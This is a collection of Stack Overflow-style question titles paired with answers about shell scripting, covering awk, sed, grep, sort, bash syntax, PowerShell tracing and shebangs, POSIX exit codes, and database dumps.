    "How to print 5 consecutive lines after a pattern in file using awk [duplicate]": "Another way to do it in AWK:\nawk '/PATTERN/ {for(i=1; i<=5; i++) {getline; print}}' inputfile\nin sed:\nsed -n '/PATTERN/{n;p;n;p;n;p;n;p;n;p}' inputfile\nin GNU sed:\nsed -n '/PATTERN/,+7p' inputfile\nor\nsed -n '1{x;s/.*/####/;x};/PATTERN/{:a;n;p;x;s/.//;ta;q}' inputfile\nThe # characters represent a counter. Use one fewer than the number of lines you want to output.",
    "How do I calculate the mean of a column": "Awk:\nawk '{ total += $2 } END { print total/NR }' yourFile.whatever\nRead as:\nFor each line, add column 2 to a variable 'total'.\nAt the end of the file, print 'total' divided by the number of records.",
    "screen Cannot open your terminal '/dev/pts/0' - please check": "This happens because you may have done a sudo su user_name and then fired the screen command.\nThere are 2 ways to fix this.\nLogin directly to \"user_name\" via ssh.\nTake ownership of the shell by typing script /dev/null as the user user_name and then type screen",
    "What does \"/dev/null\" mean at the end of shell commands": "2> means \"redirect standard-error\" to the given file.\n/dev/null is the null file. Anything written to it is discarded.\nTogether they mean \"throw away any error messages\".",
    "How to input automatically when running a shell over SSH?": "For simple input, like two prompts and two corresponding fixed responses, you could also use a \"here document\", the syntax of which looks like this:\ntest.sh <<!\ny\npasword\n!\nThe << prefixes a pattern, in this case '!'. Everything up to a line beginning with that pattern is interpreted as standard input. This approach is similar to the suggestion to pipe a multi-line echo into ssh, except that it saves the fork/exec of the echo command and I find it a bit more readable. The other advantage is that it uses built-in shell functionality so it doesn't depend on expect.",
    "What's the reverse of shlex.split?": "We now (3.3) have a shlex.quote function. It\u2019s none other that pipes.quote moved and documented (code using pipes.quote will still work). See http://bugs.python.org/issue9723 for the whole discussion.\nsubprocess.list2cmdline is a private function that should not be used. It could however be moved to shlex and made officially public. See also http://bugs.python.org/issue1724822.",
    "How can I sort file names by version numbers?": "Edit: It turns out that Benoit was sort of on the right track and Roland tipped the balance\nYou simply need to tell sort to consider only field 2 (add \",2\"):\nfind ... | sort --version-sort --field-separator=- --key=2,2\nOriginal Answer: ignore\nIf none of your filenames contain spaces between the hyphens, you can try this:\nfind ... | sed 's/.*-\\([^-]*\\)-.*/\\1 \\0/;s/[^0-9] /.&/' | sort --version-sort --field-separator=- --key=2 | sed 's/[^ ]* //'\nThe first sed command makes the lines look like this (I added \"10\" to show that the sort is numeric):\n1.9.a command-1.9a-setup\n2.0.c command-2.0c-setup\n2.0.a command-2.0a-setup\n2.0 command-2.0-setup\n10 command-10-setup\nThe extra dot makes the letter suffixed version number sort after the version number without the suffix. The second sed command removes the prefixed version number from each line.\nThere are lots of ways this can fail.",
    "How to concat variable and string in bash script": "Strings can be concatenated by simply creating a new string and expanding the values of the previous string variables directly within it.\nvalue=\"${variable} let's expand some more vars ${other_variable}\"\nYou must always wrap variable expansions in double quotes, otherwise your string will end at the first encountered whitespace character in the variables, which is a very common mistake.\nNote that there should be no spaces around the = in an assignment.",
    "Shell script to check if specified Git branch exists? [duplicate]": "NOTE: This always returns true. This is not the right answer to the question, even though it has been accepted....\nYou could always use word boundaries around the name like \\< and \\>, but instead let Git do the work for you:\nif [ `git branch --list $branch_name` ]\nthen\n   echo \"Branch name $branch_name already exists.\"\nfi",
    "Forcing the order of output fields from cut command": "This can't be done using cut. According to the man page:\nSelected input is written in the same order that it is read, and is written exactly once.\nPatching cut has been proposed many times, but even complete patches have been rejected.\nInstead, you can do it using awk, like this:\nawk '{print($2,\"\\t\",$1)}' abcd.txt\nReplace the \\t with whatever you're using as field separator.",
    "How to get the realtime output for a shell command in golang?": "Looks like ffmpeg sends all diagnostic messages (the \"console output\") to stderr instead of stdout. Below code works for me.\npackage main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os/exec\"\n    \"strings\"\n)\n\nfunc main() {\n    args := \"-i test.mp4 -acodec copy -vcodec copy -f flv rtmp://aaa/bbb\"\n    cmd := exec.Command(\"ffmpeg\", strings.Split(args, \" \")...)\n\n    stderr, _ := cmd.StderrPipe()\n    cmd.Start()\n\n    scanner := bufio.NewScanner(stderr)\n    scanner.Split(bufio.ScanWords)\n    for scanner.Scan() {\n        m := scanner.Text()\n        fmt.Println(m)\n    }\n    cmd.Wait()\n}\nThe version of ffmpeg is detailed as below.\nffmpeg version 3.0.2 Copyright (c) 2000-2016 the FFmpeg developers\nbuilt with Apple LLVM version 7.3.0 (clang-703.0.29)\nconfiguration: --prefix=/usr/local/Cellar/ffmpeg/3.0.2 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-opencl --enable-libx264 --enable-libmp3lame --enable-libxvid --enable-vda\nlibavutil      55. 17.103 / 55. 17.103\nlibavcodec     57. 24.102 / 57. 24.102\nlibavformat    57. 25.100 / 57. 25.100\nlibavdevice    57.  0.101 / 57.  0.101\nlibavfilter     6. 31.100 /  6. 31.100\nlibavresample   3.  0.  0 /  3.  0.  0\nlibswscale      4.  0.100 /  4.  0.100\nlibswresample   2.  0.101 /  2.  0.101\nlibpostproc    54.  0.100 / 54.  0.100",
    "Getting exit code of last shell command in another script": "You'd really need to use a shell function in order to accomplish that. For a simple script like that it should be pretty easy to have it working in both zsh and bash. Just place the following in a file:\nmy_notify() {\n  echo \"exit code: $?\"\n  echo \"PPID: $PPID\"\n}\nThen source that file from your shell startup files. Although since that would be run from within your interactive shell, you may want to use $$ rather than $PPID.",
    "How can I create and open a file from terminal with a single command?": "in .bashrc\nlazytouch()\n{\n  touch $1\n  open $1\n}\nthen type\n$ lazytouch anything.really",
    "Commands to execute background process in Docker CMD": "Besides the comments on your question that already pointed out a few things about Docker best practices you could anyway start a background process from within your start.sh script and keep that start.sh script itself in foreground using the nohup command and the ampersand (&). I did not try it with mongod but something like the following in your start.sh script could work:\n#!/bin/sh\n...\nnohup sh -c mongod --dbpath /test &\n...",
    "Run executable from php without spawning a shell": "",
    "How to parse a CSV in a Bash script?": "As an alternative to cut- or awk-based one-liners, you could use the specialized csvtool aka ocaml-csv:\n$ csvtool -t ',' col \"$index\" - < csvfile | grep \"$value\"\nAccording to the docs, it handles escaping, quoting, etc.",
    "How to read plist information (bundle id) from a shell script": "The defaults command can read/write to any plist file, just give it a path minus the .plist extension:\n$ defaults read /Applications/Preview.app/Contents/Info CFBundleIdentifier\n\ncom.apple.Preview\nThis pulls the CFBundleIdentifier value directly from the application bundle's Info.plist file.\nDefaults also works with binary plists without any extra steps.",
    "How can I trim white space from a variable in awk?": "You're printing the result of the gsub, but gsub does an in-place modify of $2 instead of returning a modified copy. Call gsub, then print:\nawk -F\\, '{gsub(/[ \\t]+$/, \"\", $2); print $2 \":\"}'",
    "Batch renaming files in command line and Xargs": "This can be also be done with xargs and sed to change the file extension.\nls | grep \\.png$ | sed 'p;s/\\.png/\\.jpg/' | xargs -n2 mv\nYou can print the original filename along with what you want the filename to be. Then have xargs use those two arguments in the move command. For the one-liner, I also added a grep to filter out anything not a *.png file.",
    "how to replace two things at once with sed?": "The following sed example should solve your problem. sed allows multiple -e switches, which allows you to replace more than one thing at a time.\nsed -e 's/dog/monkey/g' -e 's/orange/cow/g'",
    "replace a particular text in all the files using single line shell command": "sed -i.bak 's/old/new/g' *.php\nto do it recursively\nfind /path -type f -iname '*.php' -exec sed -i.bak 's/old/new/' \"{}\" +;",
    "Getting a Scala interpreter to work": "For OS X, I highly recommend Homebrew.\nThe installation of Homebrew is incredibly easy. Once installed, you just need to run brew install scala and scala will be installed and ready to go. Homebrew also has tons of other goodies just a brew install away.\nIf you don't already have Java installed, you can install that with brew cask install java.\nMacPorts or Fink may have something similar, but I prefer Homebrew.",
    "How to handle missing args in shell script": "Typical shell scripts begin by parsing the options and arguments passed on the command line.\nThe number of positional parameters (arguments) is stored in the # special parameter:\n#\n($#) Expands to the number of positional parameters in decimal.\nSimple example\nFor example, if your scripts requires exactly 3 arguments, you can test like this:\nif [ $# -lt 3 ]; then\n  echo 1>&2 \"$0: not enough arguments\"\n  exit 2\nelif [ $# -gt 3 ]; then\n  echo 1>&2 \"$0: too many arguments\"\n  exit 2\nfi\n# The three arguments are available as \"$1\", \"$2\", \"$3\"\nHandle missing arguments by printing a message and returning an exit code\necho 1>&2 \"$0: not enough arguments\": The echo command is used to print text to the output. The following arguments are as follows:\nThe output is redirected (>&) from standard output (denoted by file descriptor 1) to standard error (file descriptor 2).\nThe message printed is specified in double-quotes as \"$0: not enough arguments\". The special parameter $0 is expanded to the name of the shell script (e.g. if you invoked the script like ./my_script.sh the message will start with this as expansion for $0).\nexit 2: The built-in command exit terminates the script execution. The integer argument is the return value of the script, here 2 is commonly used to indicate an error:\n0: to indicate success and a small positive integer to indicate failure.\n1: by common convention means \u201cnot found\u201d (think of the grep command)\n2: means \u201cunexpected error\u201d (unrecognized option, invalid input file name, etc.).\nAdvanced command-line parsing\nIf your script takes options (like -x), use special utilities like getopts to parse arguments and options.\nSee also\nWork the Shell - Special Variables I: the Basics | Linux Journal\nWhat does \" 2>&1 \" mean?",
    "How can I test if line is empty in shell script?": "Since read reads whitespace-delimited fields by default, a line containing only whitespace should result in the empty string being assigned to the variable, so you should be able to skip empty lines with just:\n[ -z \"$line\" ] && continue",
    "how to write finding output to same file using awk command": "Not possible per se. You need a second temporary file because you can't read and overwrite the same file. Something like:\nawk '(PROGRAM)' testfile.txt > testfile.tmp && mv testfile.tmp testfile.txt\nThe mktemp program is useful for generating unique temporary file names.\nThere are some hacks for avoiding a temporary file, but they rely mostly on caching and read buffers and quickly get unstable for larger files.",
    "Import Multiple .sql dump files into mysql database from shell": "cat *.sql | mysql? Do you need them in any specific order?\nIf you have too many to handle this way, then try something like:\nfind . -name '*.sql' | awk '{ print \"source\",$0 }' | mysql --batch\nThis also gets around some problems with passing script input through a pipeline though you shouldn't have any problems with pipeline processing under Linux. The nice thing about this approach is that the mysql utility reads in each file instead of having it read from stdin.",
    "How to split a file using a numeric suffix": "Since the primary help from GNU split says:\nUsage: /usr/gnu/bin/split [OPTION]... [INPUT [PREFIX]]\nOutput fixed-size pieces of INPUT to PREFIXaa, PREFIXab, ...; default\nsize is 1000 lines, and default PREFIX is 'x'.  With no INPUT, or when INPUT\nis -, read standard input.\n\nMandatory arguments to long options are mandatory for short options too.\n  -a, --suffix-length=N   generate suffixes of length N (default 2)\n      --additional-suffix=SUFFIX  append an additional SUFFIX to file names.\n  -b, --bytes=SIZE        put SIZE bytes per output file\n  -C, --line-bytes=SIZE   put at most SIZE bytes of lines per output file\n  -d, --numeric-suffixes[=FROM]  use numeric suffixes instead of alphabetic.\n                                   FROM changes the start value (default 0).\n  -e, --elide-empty-files  do not generate empty output files with '-n'\n      --filter=COMMAND    write to shell COMMAND; file name is $FILE\n  -l, --lines=NUMBER      put NUMBER lines per output file\n  -n, --number=CHUNKS     generate CHUNKS output files.  See below\n  -u, --unbuffered        immediately copy input to output with '-n r/...'\n      --verbose           print a diagnostic just before each\n                            output file is opened\n      --help     display this help and exit\n      --version  output version information and exit\nIt looks to me like you need to reorganize your options a bit:\nsplit -a 4 -d -l 50000 domains.xml domains_",
    "How to execute shell commands synchronously in PHP": "",
    "How to grep the last occurrence of a line pattern": "I'm not sure I got your question right, but here are a few ideas:\nPrint last occurence of x (regex):\n  grep x file | tail -1\nAlternatively (should be faster because it reads from the end):\n  tac file | grep -m1 x\nPrint file from first matching line to end:\n  awk '/x/{flag = 1}; flag' file\nPrint file from last matching line to end (prints all lines in case of no match):\n  tac file | awk '!flag; /x/{flag = 1};' | tac",
    "Move files to directories based on extension": "There is no trigger for when a file is added to a directory. If the file is uploaded via a webpage, you might be able to make the webpage do it.\nYou can put a script in crontab to do this, on unix machines (or task schedular in windows). Google crontab for a how-to.\nAs for combining your commands, use the following:\nmv *.mp3 *.ogg ../../Music\nYou can include as many different \"globs\" (filenames with wildcards) as you like. The last thing should be the target directory.",
    "cat file with no line wrap": "You may be looking for fmt:\nfmt file\nThis pretty aggressively reformats your text, so it may do more than what you want.\nAlternatively, the cut command can cut text to a specific column width, discarding text beyond the right margin:\ncat file | cut -c1-80\nAnother handy option is the less -S command, which displays a file in a full screen window with left/right scrolling for long lines:\nless -S file",
    "syntax error in conditional expression: unexpected token `;'": "elif [[ \"$firstParam\" == \"update\"]]; then \nshould be\nelif [[ \"$firstParam\" == \"update\" ]]; then\nwith a space between \"update\" and ]]",
    "\\curl ... | bash ... what's the slash for? [duplicate]": "This is used to call the \"original\" command, avoiding it to be called with the possible aliases. That is, disables the possible aliases on the command curl and adjusts to the original one.\nIf you have\nalias grep='grep --color=auto'\nand then you do grep, it will have colours. So if you do not want colours, you would just write \\grep.",
    "How to disable the auto comment in shell script vi editing?": "I was finding the same answer, try\n:set paste\nthis may help",
    "grep a large list against a large file": "Try\ngrep -f the_ids.txt huge.csv\nAdditionally, since your patterns seem to be fixed strings, supplying the -F option might speed up grep.\n   -F, --fixed-strings\n          Interpret PATTERN as a  list  of  fixed  strings,  separated  by\n          newlines,  any  of  which is to be matched.  (-F is specified by\n          POSIX.)",
    "How to export a PostgreSQL query output to a csv file": "Modern syntax:\nCOPY (SELECT * FROM ...) TO '/tmp/filename.csv' (FORMAT csv);\nSo the 162 rows of my output table have been copied in the shell. How can I paste or move them to a csv file?\nThe result is the CSV file. Open it with any spreadsheet program using matching delimiters. The manual:\nThe default is a tab character in text format, a comma in CSV format\nThe psql meta command \\copy is a wrapper around the SQL COPY function. It writes and reads files local to the client (while COPY uses files local to the server) and does not require superuser privileges.\nSee:\nExport specific rows from a PostgreSQL table as INSERT SQL script\nPostgreSQL: export resulting data from SQL query to Excel/CSV",
    "Is there a way to find the running time of the last executed command in the shell?": "zsh has some built in features to time how long commands take.\nIf you enable the inc_append_history_time option with\nsetopt inc_append_history_time\nThen the time taken to run every command is saved in your history and then can be viewed with history -D.",
    "What shell am I in?": "The command or path to the currently running shell is stored in the environment variable $0. To see its value, use:\necho $0\nThis outputs either your currently running shell or the path to your currently running shell, depending on how it was invoked. Some processing might be required:\nprompt:~$ echo $0\n/bin/bash\nprompt:~$ sh\nsh-4.0$ echo $0\nsh\nsh-4.0$ exit\nexit\nprompt:~$ /bin/sh\nsh-4.0$ echo $0\n/bin/sh\nsh-4.0$\nThe $SHELL environment variable contains the user's preferred shell, not necessarily the currently running shell.",
    "Make a copy of a file and give it a different name mac terminal": "cp can get a name of a target file:\ncp bla.txt ./bla2.txt\nOr even simpler, as Mark noted:\ncp bla.txt bla2.txt",
    "Exit codes bigger than 255 \u2014 possible?": "Using wait() or waitpid()\nIt is not possible on Unix and derivatives using POSIX functions like wait() and waitpid(). The exit status information returned consists of two 8-bit fields, one containing the exit status, and the other containing information about the cause of death (0 implying orderly exit under program control, other values indicating that a signal killed it, and indicating whether a core was dumped).\nUsing sigaction() with SA_SIGINFO\nIf you work hard, and read the POSIX specification of sigaction() and <signal.h> and Signal Actions, you will find that you can get hold of the 32-bit value passed to exit() by a child process. However, it is not completely straight-forward.\n#include <errno.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\nstatic siginfo_t sig_info = { 0 };\nstatic volatile sig_atomic_t sig_num = 0;\nstatic void *sig_ctxt = 0;\n\nstatic void catcher(int signum, siginfo_t *info, void *vp)\n{\n    sig_num = signum;\n    sig_info = *info;\n    sig_ctxt = vp;\n}\n\nstatic void set_handler(int signum)\n{\n    struct sigaction sa;\n    sa.sa_flags = SA_SIGINFO;\n    sa.sa_sigaction = catcher;\n    sigemptyset(&sa.sa_mask);\n\n    if (sigaction(signum, &sa, 0) != 0)\n    {\n        int errnum = errno;\n        fprintf(stderr, \"Failed to set signal handler (%d: %s)\\n\", errnum, strerror(errnum));\n        exit(1);\n    }\n}\n\nstatic void prt_interrupt(FILE *fp)\n{\n    if (sig_num != 0)\n    {\n        fprintf(fp, \"Signal %d from PID %d (status 0x%.8X; UID %d)\\n\",\n                sig_info.si_signo, (int)sig_info.si_pid, sig_info.si_status,\n                (int)sig_info.si_uid);\n        sig_num = 0;\n    }\n}\n\nstatic void five_kids(void)\n{\n    const int base = 0xCC00FF40;\n    for (int i = 0; i < 5; i++)\n    {\n        pid_t pid = fork();\n        if (pid < 0)\n            break;\n        else if (pid == 0)\n        {\n            printf(\"PID %d - exiting with status %d (0x%.8X)\\n\",\n                   (int)getpid(), base + i, base + i);\n            exit(base + i);\n        }\n        else\n        {\n            int status = 0;\n            pid_t corpse = wait(&status);\n            if (corpse != -1)\n                printf(\"Child: %d; Corpse: %d; Status = 0x%.4X - waited\\n\", pid, corpse, (status & 0xFFFF));\n            struct timespec nap = { .tv_sec = 0, .tv_nsec = 1000000 }; // 1 millisecond\n            nanosleep(&nap, 0);\n            prt_interrupt(stdout);\n            fflush(0);\n        }\n    }\n}\n\nint main(void)\n{\n    set_handler(SIGCHLD);\n    five_kids();\n}\nWhen run (program sigexit73 compiled from sigexit73.c), this produces output like:\n$ sigexit73\nPID 26599 - exiting with status -872349888 (0xCC00FF40)\nSignal 20 from PID 26599 (status 0xCC00FF40; UID 501)\nChild: 26600; Corpse: 26599; Status = 0x4000 - waited\nPID 26600 - exiting with status -872349887 (0xCC00FF41)\nSignal 20 from PID 26600 (status 0xCC00FF41; UID 501)\nChild: 26601; Corpse: 26600; Status = 0x4100 - waited\nPID 26601 - exiting with status -872349886 (0xCC00FF42)\nSignal 20 from PID 26601 (status 0xCC00FF42; UID 501)\nChild: 26602; Corpse: 26601; Status = 0x4200 - waited\nPID 26602 - exiting with status -872349885 (0xCC00FF43)\nSignal 20 from PID 26602 (status 0xCC00FF43; UID 501)\nChild: 26603; Corpse: 26602; Status = 0x4300 - waited\nPID 26603 - exiting with status -872349884 (0xCC00FF44)\nSignal 20 from PID 26603 (status 0xCC00FF44; UID 501)\n$\nWith the one millisecond call to nanosleep() removed, the output is apt to look like:\n$ sigexit73\nsigexit23\nPID 26621 - exiting with status -872349888 (0xCC00FF40)\nSignal 20 from PID 26621 (status 0xCC00FF40; UID 501)\nChild: 26622; Corpse: 26621; Status = 0x4000 - waited\nPID 26622 - exiting with status -872349887 (0xCC00FF41)\nPID 26623 - exiting with status -872349886 (0xCC00FF42)\nSignal 20 from PID 26622 (status 0xCC00FF41; UID 501)\nChild: 26624; Corpse: 26623; Status = 0x4200 - waited\nSignal 20 from PID 26623 (status 0xCC00FF42; UID 501)\nChild: 26625; Corpse: 26622; Status = 0x4100 - waited\nPID 26624 - exiting with status -872349885 (0xCC00FF43)\nPID 26625 - exiting with status -872349884 (0xCC00FF44)\n$\nNote that there are only three lines starting Signal here, and also only three lines ending waited; some of the signals and exit statuses are lost. This is likely to be because of timing issues between the SIGCHLD signals being set to the parent process.\nHowever, the key point is that 4 bytes of data can be transmitted in the exit() status when the code uses sigaction(), SIGCHLD, SA_SIGINFO to track the status.\nJust for the record, the testing was performed on a MacBook Pro running macOS Mojave 10.14.6, using GCC 9.2.0 and XCode 11.3.1. The code is also available in my SOQ (Stack Overflow Questions) repository on GitHub as file sigexit73.c in the src/so-1843-7779 sub-directory.",
    "jq: error: test1/0 is not defined at <top-level>, line 1": "You have some extra quotes in there and test1 needs to be [\"test1\"]\njq \".environments.${Environment_Name} += [\\\"test1\\\"]\" tmp.json",
    "How can I use a shebang in a PowerShell script?": "Quick note for Linux/macOS users finding this:\nEnsure the pwsh or powershell command is in PATH\nUse this interpreter directive: #!/usr/bin/env pwsh\nEnsure the script uses Unix-style line endings (\\n, not \\r\\n)\nThanks to briantist's comments, I now understand that this isn't directly supported for PowerShell versions earlier than 6.0 without compromises:\n...[in PowerShell Core 6.0] they specifically changed positional parameter 0 from \u2011Command to \u2011File to make that work. ...the error message you're getting is because it's passing a path to \u2011Command...\nA Unix-like system passes the PowerShell script's absolute filename to the interpreter specified by the \"shebang\" as the first argument when we invoke the script as a command. In general, this can sometimes work for PowerShell 5 and below because PowerShell, by default, interprets the script filename as the command to execute.\nHowever, we cannot rely on this behavior because when PowerShell's handles -Command in this context, it re-interprets the filename as if it was typed at the prompt, so the path of a script that contains spaces or certain symbols will break the \"command\" that PowerShell sees as the argument. We also lose a bit of efficiency for the preliminary interpretation step.\nWhen specifying the -File parameter instead, PowerShell loads the script directly, so we can avoid the problems we experience with -Command. Unfortunately, to use this option in the shebang line, we need to sacrifice the portability we gain by using the env utility described in the question because operating system program loaders usually allow only one argument to the program declared in the script for the interpreter.\nFor example, the following interpreter directive is invalid because it passes two arguments to the env command (powershell and -File):\n#!/usr/bin/env powershell -File\nIn an MSYS system (like Git Bash), on the other hand, a PowerShell script that contains the following directive (with the absolute path to PowerShell) executes as expected:\n#!/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -File\n...but we cannot directly execute the script on another system that doesn't follow the same filesystem convention.\nThis also doesn't fix the original problem in Cygwin. As described in the question, the path to the script itself isn't translated to a Windows-style path, so PowerShell cannot locate the file (even in version 6). I figured out a couple of workarounds, but neither provide a perfect solution.\nThe simplest approach just exploits the default behavior of PowerShell's -Command parameter. After adding the Write-Foo.ps1 script to the environment's command search path (PATH), we can invoke PowerShell with the script name, sans the extension:\n$ powershell Write-Foo arg1 arg2 ...\nAs long as the script file itself doesn't contain spaces in the filename, this allows us to run the script from any working directory\u2014no shebang needed. PowerShell uses a native routine to resolve the command from the PATH, so we don't need to worry about spaces in the parent directories. We lose Bash's tab-completion for the command name, though.\nTo get the shebang to work in Cygwin, I needed to write a proxy script that converts the path style of the invoked script to a format that PowerShell understands. I called it pwsh (for portability with PS 6) and placed it in the PATH:\n#!/bin/sh\n\nif [ ! -f \"$1\" ]; then \n    exec \"$(command -v pwsh.exe || command -v powershell.exe)\" \"$@\"\n    exit $?\nfi\n\nscript=\"$(cygpath -w \"$1\")\"\nshift\n\nif command -v pwsh.exe > /dev/null; then \n    exec pwsh.exe \"$script\" \"$@\"\nelse\n    exec powershell.exe -File \"$script\" \"$@\"\nfi\nThe script begins by checking the first argument. If it isn't a file, we just start PowerShell normally. Otherwise, the script translates the filename to a Windows-style path. This example falls back to powershell.exe if pwsh.exe from version 6 isn't available. Then we can use the following interpreter directive in the script...\n#!/usr/bin/env pwsh\n...and invoke a script directly:\n$ Write-Foo.ps1 arg1 arg2 ...\nFor PowerShell versions before 6.0, the script can be extended to symlink or write out a temporary PowerShell script with a .ps1 extension if we want to create the originals without an extension.",
    "Java's interactive shell like ipython [closed]": "groovysh:\nhttp://groovy.codehaus.org/Groovy+Shell\nRich cross-platform edit-line editing, history and completion thanks to JLine.\nANSI colors (prompt, exception traces, etc).\nSimple, yet robust, command system with online help, user alias support and more.\nUser profile support",
    "Regex to batch rename files in OS X Terminal": "You can install perl based rename utility:\nbrew install rename\nand than just use it like:\nrename 's/123/onetwothree/g' *\nif you'd like to test your regex without renaming any files just add -n switch",
    "How can I check a file exists and execute a command if not?": "[ -f /tmp/filename.pid ] || python daemon.py restart\n-f checks if the given path exists and is a regular file (just -e checks if the path exists)\nthe [] perform the test and returns 0 on success, 1 otherwise\nthe || is a C-like or, so if the command on the left fails, execute the command on the right.\nSo the final statement says, if /tmp/filename.pid does NOT exist then start the daemon.",
    "printf in bash: \"09\" and \"08\" are invalid numbers, \"07\" and \"06\" are fine": "If you have your \"09\" in a variable, you can do\na=\"09\"\necho \"$a\"\necho \"${a#0}\"\nprintf \"%04d\" \"${a#0}\"\nWhy does this help? Well, a number literal starting with 0 but having no x at the 2nd place is interpreted as octal value.\nOctal value only have the digits 0..7, 8 and 9 are unknown.\n\"${a#0}\" strips one leading 0. The resulting value can be fed to printf then, which prints it appropriately, with 0 prefixed, in 4 digits.\nIf you have to expect that you get values such as \"009\", things get more complicated as you'll have to use a loop which eliminates all excess 0s at the start, or an extglob expression as mentioned in the comments.",
    "youtube-dl DASH video and audio in highest quality without human intervention": "Just use -f bestvideo+bestaudio/best for highest resulting quality available.\nIf you wanted to prefer MP4 format containers instead of WebM, use:\n-f bestvideo[ext!=webm]\u200c+bestaudio[ext!=webm]\u200c/best[ext!=webm].",
    "How to run a PowerShell script with verbose output?": "Just goes to show, @JamesKo, if you ask the wrong question you get the wrong answer :-(. Several people put forth good-faith answers here based on (a) lack of Linux exposure and (b) your use of the term verbose. In the following I will walk you through how Linux relates to PowerShell on this topic, but feel free to jump to the answer at the end if you are in a hurry. :-)\nBackground\nIn PowerShell, verbose has a very specific meaning which the PowerShell man page is even rather vague about:\nDisplays detailed information about the operation performed by the command. This information resembles the information in a trace or in a transaction log. This parameter works only when the command generates a verbose message.\nIt even sounds like what you want... but let's compare that to the Linux documentation for set -x which, depending on your flavor of Linux, could be this (from man-pages project)...\nThe shell shall write to standard error a trace for each command after it expands the command and before it executes it.\nor this (from gnu)...\nPrint a trace of simple commands, for commands, case commands, select commands, and arithmetic for commands and their arguments or associated word lists after they are expanded and before they are executed.\nThe very first line of your question clearly and concisely agrees with these. But verbose in PowerShell is different. In a nutshell, turning on verbose mode (be it with the -Verbose command line switch or the $VerbosePreference variable) simply enables output from the verbose stream to the console. (Just like Linux offers two streams, stdout and stderr, PowerShell offers multiple streams: output stream, error stream, warning stream, verbose stream, and debug stream. You work with these streams in an identical fashion to that of Linux--you can even use, e.g., commands 4>&1 to merge the verbose stream to stdout, for example. (You can read more about PowerShell's multiple output streams in the Basic Writing Streams section of PowerShell One-Liners: Accessing, Handling and Writing Data and a good quick reference is the Complete Guide to PowerShell Punctuation.)\nThe Answer\nThe Set-PSDebug command will give you bash-equivalent tracing. You can even adjust the tracing detail with the -Trace parameter. First, here's the control, before using Set-PSDebug:\nPS> Get-PSDepth\n0\nWith a value of 1 you get each line of code as it executes, e.g.:\nPS> Set-PSDebug -Trace 1\nPS> Get-PSDepth\nDEBUG:    1+  >>>> Get-PSDepth\nDEBUG:  141+  >>>> {\nDEBUG:  142+   >>>> $nest = -1\nDEBUG:  143+   >>>> $thisId = $pid\nDEBUG:  144+  while ( >>>> (ps -id $thisId).Name -eq 'powershell') {\nDEBUG:  145+    >>>> $thisId = (gwmi win32_process -Filter \"processid='$thisId'\").ParentProcessId\nDEBUG:  146+    >>>> $nest++\nDEBUG:  144+  while ( >>>> (ps -id $thisId).Name -eq 'powershell') {\nDEBUG:  148+   >>>> $nest\n0\nDEBUG:  149+  >>>> }\nWith a value of 2 you also get variable assignments and code paths:\nPS> Set-PSDebug -Trace 2\nPS> Get-PSDepth\nDEBUG:    1+  >>>> Get-PSDepth\nDEBUG:     ! CALL function '<ScriptBlock>'\nDEBUG:  141+  >>>> {\nDEBUG:     ! CALL function 'Get-PSDepth'  (defined in file 'C:\\Users\\msorens\\Documents\\WindowsPowerShell\\profile.ps1')\nDEBUG:  142+   >>>> $nest = -1\nDEBUG:     ! SET $nest = '-1'.\nDEBUG:  143+   >>>> $thisId = $pid\nDEBUG:     ! SET $thisId = '9872'.\nDEBUG:  144+  while ( >>>> (ps -id $thisId).Name -eq 'powershell') {\nDEBUG:  145+    >>>> $thisId = (gwmi win32_process -Filter \"processid='$thisId'\").ParentProcessId\nDEBUG:     ! SET $thisId = '10548'.\nDEBUG:  146+    >>>> $nest++\nDEBUG:     ! SET $nest = '0'.\nDEBUG:  144+  while ( >>>> (ps -id $thisId).Name -eq 'powershell') {\nDEBUG:  148+   >>>> $nest\n0\nDEBUG:  149+  >>>> }\nThose are traces of a simple cmdlet I wrote called Get-PSDepth. It prints the commands, assignments, etc. with the DEBUG prefix, intermixed with the actual output, which in this case is the single line containing just 0.",
    "Is there a Python equivalent to the 'which' command [duplicate]": "Python 3.3 added shutil.which() to provide a cross-platform means of discovering executables:\nhttp://docs.python.org/3.3/library/shutil.html#shutil.which\nReturn the path to an executable which would be run if the given cmd was called. If no cmd would be called, return None.\nSample calls:\n>>> shutil.which(\"python\")\n'/usr/local/bin/python'\n\n>>> shutil.which(\"python\")\n'C:\\\\Python33\\\\python.EXE'\nUnfortunately, this has not been backported to 2.7.x.",
    "Redirect echo output in shell script to logfile": "You can add this line on top of your script:\n#!/bin/bash\n# redirect stdout/stderr to a file\nexec >logfile.txt 2>&1\nOR else to redirect only stdout use:\nexec > logfile.txt",
    "Postgres dump specific table with a capital letter": "Here is the complete command to dump your table in plain mode:\npg_dump --host localhost --port 5432 --username \"postgres\" --role \"postgres\"  --format plain  --file \"complete_path_file\" --table \"schema_name.\\\"table_name\\\"\" \"database_name\"\nOR you can just do:\npg_dump -t '\"tablename\"' database_name > data_base.sql\nLook to the last page here: Documentation",
    "Sort CSV file based on first column": "sort -k1 -n -t, filename should do the trick.\n-k1 sorts by column 1.\n-n sorts numerically instead of lexicographically (so \"11\" will not come before \"2,3...\").\n-t, sets the delimiter (what separates values in your file) to , since your file is comma-separated.",
    "Mac OS X - run shell script from the desktop GUI": "Yes - just put a .command suffix on the script.\nNote: make sure the script is executable, e.g.\n$ chmod +x myscript.command",
    "\"Invalid Arithmetic Operator\" when doing floating-point math in bash": "bash does not support floating-point arithmetic. You need to use an external utility like bc.\n# Like everything else in shell, these are strings, not\n# floating-point values\nd1=0.003\nd2=0.0008\n\n# bc parses its input to perform math\nd1d2=$(echo \"$d1 + $d2\" | bc)\n\n# These, too, are strings (not integers)\nmean1=7\nmean2=5\n\n# $((...)) is a built-in construct that can parse\n# its contents as integers; valid identifiers\n# are recursively resolved as variables.\nmeandiff=$((mean1 - mean2))",
    "Invoking a script, which has an awk shebang, with parameters (vars)": "Try using:\n#!/usr/bin/awk -f\nas an interpreter",
    "How do I get diffs of all the files in a pending Perforce changelist?": "Shelve the changes in the pending changelist, then run\np4 describe -S -du 999",
